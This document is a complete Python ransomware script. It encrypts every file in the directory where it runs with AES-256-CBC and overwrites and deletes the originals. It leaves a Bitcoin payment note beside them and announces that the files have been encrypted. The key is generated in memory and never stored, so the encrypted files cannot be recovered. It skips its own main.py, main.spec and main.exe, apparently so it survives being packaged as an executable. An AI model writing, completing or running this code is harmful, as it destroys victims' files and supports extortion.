import os
import random
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# Generate a random key and IV
def generate_key_and_iv():
    key = os.urandom(32) # 256-bit key (32 bytes) for AES encryption
    iv = os.urandom(16) # 128-bit IV (16 bytes)
    return key, iv
    
# Function to create a placeholder BTC address file
def create_btc_address_file(directory):
    btc_address = "Pay BTC here: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # Example BTC address
    btc_file_path = os.path.join(directory, "BTC_Payment_Info.txt")

    # Write the BTC address to the text file
    with open(btc_file_path, 'w') as btc_file:
        btc_file.write(btc_address)

# Secure file deletion (overwrite and remove)
def secure_delete(file_path, passes=8):
    with open(file_path, 'r+b') as f:
        length = os.path.getsize(file_path)
        for _ in range(passes):
            f.seek(0)
            f.write(bytearray(random.getrandbits(4) for _ in range(length)))
    os.remove(file_path)
    
    # Debugging
    #print(f"File {file_path} has been securely deleted.")

# Function to encrypt a file
def encrypt_file(file_path, key, iv):
    with open(file_path, 'rb') as f:
        data = f.read()
        
    # Padding to ensure the data is a multiple of block size (128 bits = 16 bytes)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    # Create AES Cipher with CBC mode
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    # Encrypt the data
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Add '.enc' extension to the encrypted file
    encrypted_file_path = file_path + '.enc'

    # Save and replace files with encrypted data
    with open(encrypted_file_path, 'wb') as enc_file:
        enc_file.write(encrypted_data)
        secure_delete(file_path) # Securely delete the original file
        
        # Debugging
        # print(f"Original file {file_path} has been encrypted and deleted. Encrypted version is saved as {encrypted_file_path}")

    # Create BTC address files in current folder
    if os.path.exists(os.path.dirname(file_path)):
        create_btc_address_file(os.path.dirname(file_path))
        
        # Create BTC address file in folder above
        # parent_dir = os.path.dirname(os.path.dirname(file_path))  # Parent directory
        # if os.path.exists(parent_dir):
        #     create_btc_address_file(parent_dir)
        # subdirectory = os.path.dirname(file_path)  # Folder containing the file
        # if subdirectory != parent_dir and os.path.exists(subdirectory):
        #     create_btc_address_file(subdirectory)  # In the subdirectory

# Encrypt all files in the current directory
def encrypt_files_in_directory(directory):
    key, iv = generate_key_and_iv()  # Generate a key and IV for encryption
    
    # Iterate over all files in the directory
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)

        # Skip encryption for main.py
        if filename == "main.py" or filename == "main.spec" or filename == "main.exe":
            continue

        # Encrypt only files (not directories)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key, iv)

# Main function to execute the program
if __name__ == "__main__":
    current_directory = os.getcwd()  # Get the current working directory
    encrypt_files_in_directory(current_directory)
    print("All your files in directory have been encrypted!")
